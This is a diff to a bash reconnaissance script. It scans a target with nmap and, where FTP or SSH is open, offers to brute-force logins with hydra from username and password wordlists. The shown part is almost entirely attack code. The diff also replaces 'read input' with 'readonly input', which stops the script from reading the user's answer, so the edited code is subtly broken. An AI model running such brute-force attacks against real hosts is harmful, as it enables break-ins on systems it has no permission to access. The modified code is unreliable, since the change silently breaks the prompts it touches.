@@ -65,7 +65,7 @@ sudo nmap -sV ${target} > output.txt ; sudo chown ${UID} output.txt ; sudo chmod
 # ftp :
 if grep -q 21/tcp output.txt; then
   echo -e "${YELLOW}[${RED}!${YELLOW}] FTP service on the target ${RESET}"
-  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; read input
+  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; readonly input
   if [ ${input} = 'Y' ] || [ ${input} = 'y' ]; then
     hydra -L ${wordlist_user} -P ${wordlist_pass} ${target} ftp > br_ftp.txt
     echo -e "${YELLOW}[${RED}!${YELLOW}] Bruteforce OK - output : br_ftp.txt ${RESET}"
@@ -75,7 +75,7 @@ fi
 # ssh :
 if grep -q 22/tcp output.txt; then
   echo -e "${YELLOW}[${RED}!${YELLOW}] SSH service on the target ${RESET}"
-  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; read input
+  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; readonly input
   if [ ${input} = 'Y' ] || [ ${input} = 'y' ]; then
     hydra -L ${wordlist_user} -P ${wordlist_pass} ${target} ssh > br_ssh.txt
     echo -e "${YELLOW}[${RED}!${YELLOW}] Bruteforce OK - output : br_ssh.txt ${RESET}"
